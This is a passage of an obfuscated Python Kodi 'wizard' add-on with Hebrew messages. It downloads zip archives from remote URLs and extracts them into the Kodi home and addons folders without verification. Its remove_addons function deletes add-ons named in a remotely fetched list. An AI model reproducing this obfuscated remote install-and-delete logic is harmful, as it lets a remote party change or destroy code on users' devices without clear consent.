		if O0O0OOOOO0OO0OO0O ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5103
		elif len (O0O0OOOOO0OO0OO0O )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5104
		else :#line:5105
			for OO0OO00OOOOOOOOO0 in O0O0OOOOO0OO0OO0O :wiz .purgeDb (O0O0OO000OO0O00O0 [OO0OO00OOOOOOOOO0 ])#line:5106
	else :#line:5107
		O0O0OOOOO0OO0OO0O =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O00OO0OO0000OO0OO )#line:5108
		if O0O0OOOOO0OO0OO0O ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5109
		else :wiz .purgeDb (O0O0OO000OO0O00O0 [OO0OO00OOOOOOOOO0 ])#line:5110
def fastupdatefirstbuild (O00O0O00OO0O0OO0O ):#line:5116
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5118
	if ENABLE =='Yes':#line:5119
		if not NOTIFY =='true':#line:5120
			O00OO0O0000OO000O =wiz .workingURL (NOTIFICATION )#line:5121
			if O00OO0O0000OO000O ==True :#line:5122
				O00OOOOO0000O0OO0 ,O0OOOO000OO00O0O0 =wiz .splitNotify (NOTIFICATION )#line:5123
				if not O00OOOOO0000O0OO0 ==False :#line:5125
					try :#line:5126
						O00OOOOO0000O0OO0 =int (O00OOOOO0000O0OO0 );O00O0O00OO0O0OO0O =int (O00O0O00OO0O0OO0O )#line:5127
						checkidupdate ()#line:5128
						wiz .setS ("notedismiss","true")#line:5129
						if O00OOOOO0000O0OO0 ==O00O0O00OO0O0OO0O :#line:5130
							wiz .log ("[Notifications] id[%s] Dismissed"%int (O00OOOOO0000O0OO0 ),xbmc .LOGNOTICE )#line:5131
						elif O00OOOOO0000O0OO0 >O00O0O00OO0O0OO0O :#line:5133
							wiz .log ("[Notifications] id: %s"%str (O00OOOOO0000O0OO0 ),xbmc .LOGNOTICE )#line:5134
							wiz .setS ('noteid',str (O00OOOOO0000O0OO0 ))#line:5135
							wiz .setS ("notedismiss","true")#line:5136
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5139
					except Exception as O00OO00O0OOO0OOO0 :#line:5140
						wiz .log ("Error on Notifications Window: %s"%str (O00OO00O0OOO0OOO0 ),xbmc .LOGERROR )#line:5141
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5143
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O00OO0O0000OO000O ),xbmc .LOGNOTICE )#line:5144
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5145
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5146
def checkidupdate ():#line:5152
				wiz .setS ("notedismiss","true")#line:5154
				OO00OOO0OOO0OOOOO =wiz .workingURL (NOTIFICATION )#line:5155
				O00OO0OOO000O0O0O =" Kodi Premium"#line:5157
				OOO0O0OO0OOOO0000 =wiz .checkBuild (O00OO0OOO000O0O0O ,'gui')#line:5158
				O00O00OOO0O0OO000 =O00OO0OOO000O0O0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5159
				if not wiz .workingURL (OOO0O0OO0OOOO0000 )==True :return #line:5160
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5161
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O00OO0OOO000O0O0O ),'','אנא המתן')#line:5162
				O000000O0OO0O0OOO =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00O00OOO0O0OO000 )#line:5163
				try :os .remove (O000000O0OO0O0OOO )#line:5164
				except :pass #line:5165
				logging .warning (OOO0O0OO0OOOO0000 )#line:5166
				if 'google'in OOO0O0OO0OOOO0000 :#line:5167
				   OOO0O0O0O00000OO0 =googledrive_download (OOO0O0OO0OOOO0000 ,O000000O0OO0O0OOO ,DP ,wiz .checkBuild (O00OO0OOO000O0O0O ,'filesize'))#line:5168
				else :#line:5171
				  downloader .download (OOO0O0OO0OOOO0000 ,O000000O0OO0O0OOO ,DP )#line:5172
				xbmc .sleep (100 )#line:5173
				O00000O000OOO0O00 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OO0OOO000O0O0O )#line:5174
				DP .update (0 ,O00000O000OOO0O00 ,'','אנא המתן')#line:5175
				extract .all (O000000O0OO0O0OOO ,HOME ,DP ,title =O00000O000OOO0O00 )#line:5176
				DP .close ()#line:5177
				wiz .defaultSkin ()#line:5178
				wiz .lookandFeelData ('save')#line:5179
				if KODIV >=18 :#line:5180
					skindialogsettind18 ()#line:5181
				if INSTALLMETHOD ==1 :O00000O0O0O0O0000 =1 #line:5184
				elif INSTALLMETHOD ==2 :O00000O0O0O0O0000 =0 #line:5185
				else :DP .close ()#line:5186
def gaiaserenaddon ():#line:5188
  OOOO0O00000OOO000 =(ADDON .getSetting ("gaiaseren"))#line:5189
  OO0OO00OOO0OOO0OO =(ADDON .getSetting ("auto_rd"))#line:5190
  if OOOO0O00000OOO000 =='true'and OO0OO00OOO0OOO0OO =='true':#line:5191
    OO0OOO0OOOOO0000O =(NEWFASTUPDATE )#line:5192
    O0OO0OOOOO0OO0000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5193
    O0000O0OOOOO000O0 =xbmcgui .DialogProgress ()#line:5194
    O0000O0OOOOO000O0 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5195
    OO0O00OOOOO00O0OO =os .path .join (PACKAGES ,'isr.zip')#line:5196
    OO0OOO0O0000OO0OO =urllib2 .Request (OO0OOO0OOOOO0000O )#line:5197
    O00OO0OO00O0OOO00 =urllib2 .urlopen (OO0OOO0O0000OO0OO )#line:5198
    OO0000O00O0OOOO0O =xbmcgui .DialogProgress ()#line:5200
    OO0000O00O0OOOO0O .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5201
    OO0000O00O0OOOO0O .update (0 )#line:5202
    O0O00OOO00O000O00 =open (OO0O00OOOOO00O0OO ,'wb')#line:5204
    try :#line:5206
      OOO0O0O0000O00000 =O00OO0OO00O0OOO00 .info ().getheader ('Content-Length').strip ()#line:5207
      OO0OO00O00O00O0OO =True #line:5208
    except AttributeError :#line:5209
          OO0OO00O00O00O0OO =False #line:5210
    if OO0OO00O00O00O0OO :#line:5212
          OOO0O0O0000O00000 =int (OOO0O0O0000O00000 )#line:5213
    OO0OO0OOO00O00O00 =0 #line:5215
    OOOO0O00OO000O0OO =time .time ()#line:5216
    while True :#line:5217
          OO000OO0OO0000000 =O00OO0OO00O0OOO00 .read (8192 )#line:5218
          if not OO000OO0OO0000000 :#line:5219
              sys .stdout .write ('\n')#line:5220
              break #line:5221
          OO0OO0OOO00O00O00 +=len (OO000OO0OO0000000 )#line:5223
          O0O00OOO00O000O00 .write (OO000OO0OO0000000 )#line:5224
          if not OO0OO00O00O00O0OO :#line:5226
              OOO0O0O0000O00000 =OO0OO0OOO00O00O00 #line:5227
          if OO0000O00O0OOOO0O .iscanceled ():#line:5228
             OO0000O00O0OOOO0O .close ()#line:5229
             try :#line:5230
              os .remove (OO0O00OOOOO00O0OO )#line:5231
             except :#line:5232
              pass #line:5233
             break #line:5234
          OO00OOOO0000000OO =float (OO0OO0OOO00O00O00 )/OOO0O0O0000O00000 #line:5235
          OO00OOOO0000000OO =round (OO00OOOO0000000OO *100 ,2 )#line:5236
          O0000OO000OOOOO0O =OO0OO0OOO00O00O00 /(1024 *1024 )#line:5237
          O00OO0OOO0000OOOO =OOO0O0O0000O00000 /(1024 *1024 )#line:5238
          O00O00OO0OO0O000O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0000OO000OOOOO0O ,'teal',O00OO0OOO0000OOOO )#line:5239
          if (time .time ()-OOOO0O00OO000O0OO )>0 :#line:5240
            OOO0O0OOO00O0OOO0 =OO0OO0OOO00O00O00 /(time .time ()-OOOO0O00OO000O0OO )#line:5241
            OOO0O0OOO00O0OOO0 =OOO0O0OOO00O0OOO0 /1024 #line:5242
          else :#line:5243
           OOO0O0OOO00O0OOO0 =0 #line:5244
          O00O00OOOOO0OOO00 ='KB'#line:5245
          if OOO0O0OOO00O0OOO0 >=1024 :#line:5246
             OOO0O0OOO00O0OOO0 =OOO0O0OOO00O0OOO0 /1024 #line:5247
             O00O00OOOOO0OOO00 ='MB'#line:5248
          if OOO0O0OOO00O0OOO0 >0 and not OO00OOOO0000000OO ==100 :#line:5249
              OO00OO000O0OO0O0O =(OOO0O0O0000O00000 -OO0OO0OOO00O00O00 )/OOO0O0OOO00O0OOO0 #line:5250
          else :#line:5251
              OO00OO000O0OO0O0O =0 #line:5252
          OO0O000OOO0O0O0O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO0O0OOO00O0OOO0 ,O00O00OOOOO0OOO00 )#line:5253
          OO0000O00O0OOOO0O .update (int (OO00OOOO0000000OO ),O00O00OO0OO0O000O ,OO0O000OOO0O0O0O0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5255
    O00OOOO0OO0OO0OO0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5258
    O0O00OOO00O000O00 .close ()#line:5261
    extract .all (OO0O00OOOOO00O0OO ,O00OOOO0OO0OO0OO0 ,OO0000O00O0OOOO0O )#line:5262
    try :#line:5266
      os .remove (OO0O00OOOOO00O0OO )#line:5267
    except :#line:5268
      pass #line:5269
def iptvsimpldownpc ():#line:5270
    OO00OO000000O00OO =(IPTVSIMPL18PC )#line:5272
    OO0O00O0OOOOO00O0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5273
    OO000OO0OO0O00O00 =xbmcgui .DialogProgress ()#line:5274
    OO000OO0OO0O00O00 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5275
    OO000O0OO000OO0O0 =os .path .join (PACKAGES ,'isr.zip')#line:5276
    OOOO0OOO0O00OO00O =urllib2 .Request (OO00OO000000O00OO )#line:5277
    O000OOO0OOOO0O0OO =urllib2 .urlopen (OOOO0OOO0O00OO00O )#line:5278
    OOO0O00O00OO000O0 =xbmcgui .DialogProgress ()#line:5280
    OOO0O00O00OO000O0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5281
    OOO0O00O00OO000O0 .update (0 )#line:5282
    O000O000OO000O00O =open (OO000O0OO000OO0O0 ,'wb')#line:5284
    try :#line:5286
      O00O0000OOO0OO00O =O000OOO0OOOO0O0OO .info ().getheader ('Content-Length').strip ()#line:5287
      OO0OO00O0O0O0OO00 =True #line:5288
    except AttributeError :#line:5289
          OO0OO00O0O0O0OO00 =False #line:5290
    if OO0OO00O0O0O0OO00 :#line:5292
          O00O0000OOO0OO00O =int (O00O0000OOO0OO00O )#line:5293
    O0OO0O000O0O000OO =0 #line:5295
    O00O00OO00OO0O00O =time .time ()#line:5296
    while True :#line:5297
          OO0O0OOOO00OO0O0O =O000OOO0OOOO0O0OO .read (8192 )#line:5298
          if not OO0O0OOOO00OO0O0O :#line:5299
              sys .stdout .write ('\n')#line:5300
              break #line:5301
          O0OO0O000O0O000OO +=len (OO0O0OOOO00OO0O0O )#line:5303
          O000O000OO000O00O .write (OO0O0OOOO00OO0O0O )#line:5304
          if not OO0OO00O0O0O0OO00 :#line:5306
              O00O0000OOO0OO00O =O0OO0O000O0O000OO #line:5307
          if OOO0O00O00OO000O0 .iscanceled ():#line:5308
             OOO0O00O00OO000O0 .close ()#line:5309
             try :#line:5310
              os .remove (OO000O0OO000OO0O0 )#line:5311
             except :#line:5312
              pass #line:5313
             break #line:5314
          O0000OO0O00O000O0 =float (O0OO0O000O0O000OO )/O00O0000OOO0OO00O #line:5315
          O0000OO0O00O000O0 =round (O0000OO0O00O000O0 *100 ,2 )#line:5316
          O0OO000O0O0OO00OO =O0OO0O000O0O000OO /(1024 *1024 )#line:5317
          O000OOOOO0OOO0O00 =O00O0000OOO0OO00O /(1024 *1024 )#line:5318
          O00O000OOOOOOOOO0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OO000O0O0OO00OO ,'teal',O000OOOOO0OOO0O00 )#line:5319
          if (time .time ()-O00O00OO00OO0O00O )>0 :#line:5320
            OO00O00O00OO0OO0O =O0OO0O000O0O000OO /(time .time ()-O00O00OO00OO0O00O )#line:5321
            OO00O00O00OO0OO0O =OO00O00O00OO0OO0O /1024 #line:5322
          else :#line:5323
           OO00O00O00OO0OO0O =0 #line:5324
          OOOOO0O0O00OOO0OO ='KB'#line:5325
          if OO00O00O00OO0OO0O >=1024 :#line:5326
             OO00O00O00OO0OO0O =OO00O00O00OO0OO0O /1024 #line:5327
             OOOOO0O0O00OOO0OO ='MB'#line:5328
          if OO00O00O00OO0OO0O >0 and not O0000OO0O00O000O0 ==100 :#line:5329
              OO0O0OO00O00000O0 =(O00O0000OOO0OO00O -O0OO0O000O0O000OO )/OO00O00O00OO0OO0O #line:5330
          else :#line:5331
              OO0O0OO00O00000O0 =0 #line:5332
          OOOOOOOOO00OOOO00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO00O00O00OO0OO0O ,OOOOO0O0O00OOO0OO )#line:5333
          OOO0O00O00OO000O0 .update (int (O0000OO0O00O000O0 ),O00O000OOOOOOOOO0 ,OOOOOOOOO00OOOO00 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5335
    O0000O0OOO0OO0O0O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5338
    O000O000OO000O00O .close ()#line:5341
    extract .all (OO000O0OO000OO0O0 ,O0000O0OOO0OO0O0O ,OOO0O00O00OO000O0 )#line:5342
    try :#line:5346
      os .remove (OO000O0OO000OO0O0 )#line:5347
    except :#line:5348
      pass #line:5349
def iptvsimpldown ():#line:5350
    O00O0O000000O00O0 =(IPTV18 )#line:5352
    OO0O0O0O00OO0OOOO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5353
    O0O00OOOOO0O0OO00 =xbmcgui .DialogProgress ()#line:5354
    O0O00OOOOO0O0OO00 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5355
    O0OOO0OOO0OO0000O =os .path .join (PACKAGES ,'isr.zip')#line:5356
    OOO000OOO00O0OOO0 =urllib2 .Request (O00O0O000000O00O0 )#line:5357
    O0O00OOO0OO0O0OO0 =urllib2 .urlopen (OOO000OOO00O0OOO0 )#line:5358
    O000O00OO0OOO000O =xbmcgui .DialogProgress ()#line:5360
    O000O00OO0OOO000O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5361
    O000O00OO0OOO000O .update (0 )#line:5362
    O0O00OO0000OOOO0O =open (O0OOO0OOO0OO0000O ,'wb')#line:5364
    try :#line:5366
      OOOO0O0O0O0OOOO0O =O0O00OOO0OO0O0OO0 .info ().getheader ('Content-Length').strip ()#line:5367
      O0OO00OO00OO00O0O =True #line:5368
    except AttributeError :#line:5369
          O0OO00OO00OO00O0O =False #line:5370
    if O0OO00OO00OO00O0O :#line:5372
          OOOO0O0O0O0OOOO0O =int (OOOO0O0O0O0OOOO0O )#line:5373
    O00OOO0OOO0O0OOOO =0 #line:5375
    O00O0000O00O00OO0 =time .time ()#line:5376
    while True :#line:5377
          OO000O0O0OO000OO0 =O0O00OOO0OO0O0OO0 .read (8192 )#line:5378
          if not OO000O0O0OO000OO0 :#line:5379
              sys .stdout .write ('\n')#line:5380
              break #line:5381
          O00OOO0OOO0O0OOOO +=len (OO000O0O0OO000OO0 )#line:5383
          O0O00OO0000OOOO0O .write (OO000O0O0OO000OO0 )#line:5384
          if not O0OO00OO00OO00O0O :#line:5386
              OOOO0O0O0O0OOOO0O =O00OOO0OOO0O0OOOO #line:5387
          if O000O00OO0OOO000O .iscanceled ():#line:5388
             O000O00OO0OOO000O .close ()#line:5389
             try :#line:5390
              os .remove (O0OOO0OOO0OO0000O )#line:5391
             except :#line:5392
              pass #line:5393
             break #line:5394
          O0000000O0O00OOO0 =float (O00OOO0OOO0O0OOOO )/OOOO0O0O0O0OOOO0O #line:5395
          O0000000O0O00OOO0 =round (O0000000O0O00OOO0 *100 ,2 )#line:5396
          O0O0000O0O000OOOO =O00OOO0OOO0O0OOOO /(1024 *1024 )#line:5397
          OO00O0OOOO0OO000O =OOOO0O0O0O0OOOO0O /(1024 *1024 )#line:5398
          OOOO0OOO0O000O00O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0O0000O0O000OOOO ,'teal',OO00O0OOOO0OO000O )#line:5399
          if (time .time ()-O00O0000O00O00OO0 )>0 :#line:5400
            OO0OO0O0O0OOOO0OO =O00OOO0OOO0O0OOOO /(time .time ()-O00O0000O00O00OO0 )#line:5401
            OO0OO0O0O0OOOO0OO =OO0OO0O0O0OOOO0OO /1024 #line:5402
          else :#line:5403
           OO0OO0O0O0OOOO0OO =0 #line:5404
          OOOO0O0OO00O0OO0O ='KB'#line:5405
          if OO0OO0O0O0OOOO0OO >=1024 :#line:5406
             OO0OO0O0O0OOOO0OO =OO0OO0O0O0OOOO0OO /1024 #line:5407
             OOOO0O0OO00O0OO0O ='MB'#line:5408
          if OO0OO0O0O0OOOO0OO >0 and not O0000000O0O00OOO0 ==100 :#line:5409
              OOO000000O0O0OOO0 =(OOOO0O0O0O0OOOO0O -O00OOO0OOO0O0OOOO )/OO0OO0O0O0OOOO0OO #line:5410
          else :#line:5411
              OOO000000O0O0OOO0 =0 #line:5412
          OO000O0OOO0OO0OOO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0OO0O0O0OOOO0OO ,OOOO0O0OO00O0OO0O )#line:5413
          O000O00OO0OOO000O .update (int (O0000000O0O00OOO0 ),OOOO0OOO0O000O00O ,OO000O0OOO0OO0OOO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5415
    OO0000000000O0000 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5418
    O0O00OO0000OOOO0O .close ()#line:5421
    extract .all (O0OOO0OOO0OO0000O ,OO0000000000O0000 ,O000O00OO0OOO000O )#line:5422
    try :#line:5426
      os .remove (O0OOO0OOO0OO0000O )#line:5427
    except :#line:5428
      pass #line:5429
def testnotify ():#line:5430
	OO000000OOO00OOOO =wiz .workingURL (NOTIFICATION )#line:5431
	if OO000000OOO00OOOO ==True :#line:5432
		try :#line:5433
			OOOOO0OOO0OO00OOO ,OO0OOOOOO0OO0OOO0 =wiz .splitNotify (NOTIFICATION )#line:5434
			if OOOOO0OOO0OO00OOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5435
			if STARTP2 ()=='ok':#line:5436
				notify .notification (OO0OOOOOO0OO0OOO0 ,True )#line:5437
		except Exception as OOOOOOOOOO0OOO00O :#line:5438
			wiz .log ("Error on Notifications Window: %s"%str (OOOOOOOOOO0OOO00O ),xbmc .LOGERROR )#line:5439
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5440
def testnotify2 ():#line:5441
	O0O000OO0O00O0O00 =wiz .workingURL (NOTIFICATION2 )#line:5442
	if O0O000OO0O00O0O00 ==True :#line:5443
		try :#line:5444
			OO0O00OO00OO00OO0 ,O00000000OOO0O00O =wiz .splitNotify (NOTIFICATION2 )#line:5445
			if OO0O00OO00OO00OO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5446
			if STARTP2 ()=='ok':#line:5447
				notify .notification2 (O00000000OOO0O00O ,True )#line:5448
		except Exception as O0OO00O00O0O00OOO :#line:5449
			wiz .log ("Error on Notifications Window: %s"%str (O0OO00O00O0O00OOO ),xbmc .LOGERROR )#line:5450
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5451
def testnotify3 ():#line:5452
	O00OOO00000000OO0 =wiz .workingURL (NOTIFICATION3 )#line:5453
	if O00OOO00000000OO0 ==True :#line:5454
		try :#line:5455
			OOO00O00OOOOO00O0 ,OO0O00OOOO0OOOO00 =wiz .splitNotify (NOTIFICATION3 )#line:5456
			if OOO00O00OOOOO00O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5457
			if STARTP2 ()=='ok':#line:5458
				notify .notification3 (OO0O00OOOO0OOOO00 ,True )#line:5459
		except Exception as OOO0OOOOO0O0000OO :#line:5460
			wiz .log ("Error on Notifications Window: %s"%str (OOO0OOOOO0O0000OO ),xbmc .LOGERROR )#line:5461
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5462
def servicemanual ():#line:5463
	OO0O0000OO00OO00O =wiz .workingURL (HELPINFO )#line:5464
	if OO0O0000OO00OO00O ==True :#line:5465
		try :#line:5466
			OOO0O0OO0OO00OO00 ,OOO0O0OOO00O0OO00 =wiz .splitNotify (HELPINFO )#line:5467
			if OOO0O0OO0OO00OO00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5468
			notify .helpinfo (OOO0O0OOO00O0OO00 ,True )#line:5469
		except Exception as O00OOOOOOO00OO00O :#line:5470
			wiz .log ("Error on Notifications Window: %s"%str (O00OOOOOOO00OO00O ),xbmc .LOGERROR )#line:5471
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5472
def testupdate ():#line:5474
	if BUILDNAME =="":#line:5475
		notify .updateWindow ()#line:5476
	else :#line:5477
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5478
def testfirst ():#line:5480
	notify .firstRun ()#line:5481
def testfirstRun ():#line:5483
	notify .firstRunSettings ()#line:5484
def fastinstall ():#line:5487
	notify .firstRuninstall ()#line:5488
def addDir (OO0O0O0OOO00O00OO ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5495
	OOO0O0O000O000O00 =sys .argv [0 ]#line:5496
	if not mode ==None :OOO0O0O000O000O00 +="?mode=%s"%urllib .quote_plus (mode )#line:5497
	if not name ==None :OOO0O0O000O000O00 +="&name="+urllib .quote_plus (name )#line:5498
	if not url ==None :OOO0O0O000O000O00 +="&url="+urllib .quote_plus (url )#line:5499
	O0O0OOO00000OOOOO =True #line:5500
	if themeit :OO0O0O0OOO00O00OO =themeit %OO0O0O0OOO00O00OO #line:5501
	O00O0OOO00O00OOOO =xbmcgui .ListItem (OO0O0O0OOO00O00OO ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5502
	O00O0OOO00O00OOOO .setInfo (type ="Video",infoLabels ={"Title":OO0O0O0OOO00O00OO ,"Plot":description })#line:5503
	O00O0OOO00O00OOOO .setProperty ("Fanart_Image",fanart )#line:5504
	if not menu ==None :O00O0OOO00O00OOOO .addContextMenuItems (menu ,replaceItems =overwrite )#line:5505
	O0O0OOO00000OOOOO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOO0O0O000O000O00 ,listitem =O00O0OOO00O00OOOO ,isFolder =True )#line:5506
	return O0O0OOO00000OOOOO #line:5507
def addFile (OO0000O0O000OOO0O ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5509
	OOOO0O0O0O0OO0000 =sys .argv [0 ]#line:5510
	if not mode ==None :OOOO0O0O0O0OO0000 +="?mode=%s"%urllib .quote_plus (mode )#line:5511
	if not name ==None :OOOO0O0O0O0OO0000 +="&name="+urllib .quote_plus (name )#line:5512
	if not url ==None :OOOO0O0O0O0OO0000 +="&url="+urllib .quote_plus (url )#line:5513
	OOOO0OOO00O000O0O =True #line:5514
	if themeit :OO0000O0O000OOO0O =themeit %OO0000O0O000OOO0O #line:5515
	O0OOOO000O000O0O0 =xbmcgui .ListItem (OO0000O0O000OOO0O ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5516
	O0OOOO000O000O0O0 .setInfo (type ="Video",infoLabels ={"Title":OO0000O0O000OOO0O ,"Plot":description })#line:5517
	O0OOOO000O000O0O0 .setProperty ("Fanart_Image",fanart )#line:5518
	if not menu ==None :O0OOOO000O000O0O0 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5519
	OOOO0OOO00O000O0O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOOO0O0O0O0OO0000 ,listitem =O0OOOO000O000O0O0 ,isFolder =False )#line:5520
	return OOOO0OOO00O000O0O #line:5521
def get_params ():#line:5523
	O000000OOOO0O0O0O =[]#line:5524
	OO00OO0O0OOOOOO0O =sys .argv [2 ]#line:5525
	if len (OO00OO0O0OOOOOO0O )>=2 :#line:5526
		OOO0O00O00OOOOOO0 =sys .argv [2 ]#line:5527
		OO000OOO0OOOO0OO0 =OOO0O00O00OOOOOO0 .replace ('?','')#line:5528
		if (OOO0O00O00OOOOOO0 [len (OOO0O00O00OOOOOO0 )-1 ]=='/'):#line:5529
			OOO0O00O00OOOOOO0 =OOO0O00O00OOOOOO0 [0 :len (OOO0O00O00OOOOOO0 )-2 ]#line:5530
		O000O00O00000000O =OO000OOO0OOOO0OO0 .split ('&')#line:5531
		O000000OOOO0O0O0O ={}#line:5532
		for OO00O0OO00OO00O00 in range (len (O000O00O00000000O )):#line:5533
			OOOO00OO00OO00OO0 ={}#line:5534
			OOOO00OO00OO00OO0 =O000O00O00000000O [OO00O0OO00OO00O00 ].split ('=')#line:5535
			if (len (OOOO00OO00OO00OO0 ))==2 :#line:5536
				O000000OOOO0O0O0O [OOOO00OO00OO00OO0 [0 ]]=OOOO00OO00OO00OO0 [1 ]#line:5537
		return O000000OOOO0O0O0O #line:5539
def remove_addons ():#line:5541
	try :#line:5542
			import json #line:5543
			O0000OOO00000O0O0 =urllib2 .urlopen (remove_url ).readlines ()#line:5544
			for O0O0OO0OOOO00OOO0 in O0000OOO00000O0O0 :#line:5545
				OO0O0000OO00000O0 =O0O0OO0OOOO00OOO0 .split (':')[1 ].strip ()#line:5547
				O00O00O00OO0O0OO0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(OO0O0000OO00000O0 ,'false')#line:5548
				OO00OOO00O00OOO00 =xbmc .executeJSONRPC (O00O00O00OO0O0OO0 )#line:5549
				OO00OOO0000OOOOO0 =json .loads (OO00OOO00O00OOO00 )#line:5550
				O0OO0000000O0O0O0 =os .path .join (addons_folder ,OO0O0000OO00000O0 )#line:5552
				if os .path .exists (O0OO0000000O0O0O0 ):#line:5554
					for O0O0000O0OOOOO00O ,OO00O0O000OO0000O ,OO0O000OOO0OO00O0 in os .walk (O0OO0000000O0O0O0 ):#line:5555
						for O0O000OOOO000O0OO in OO0O000OOO0OO00O0 :#line:5556
							os .unlink (os .path .join (O0O0000O0OOOOO00O ,O0O000OOOO000O0OO ))#line:5557
						for O0O0000OO000OOOOO in OO00O0O000OO0000O :#line:5558
							shutil .rmtree (os .path .join (O0O0000O0OOOOO00O ,O0O0000OO000OOOOO ))#line:5559
					os .rmdir (O0OO0000000O0O0O0 )#line:5560
			xbmc .executebuiltin ('Container.Refresh')#line:5562
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5563
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5564
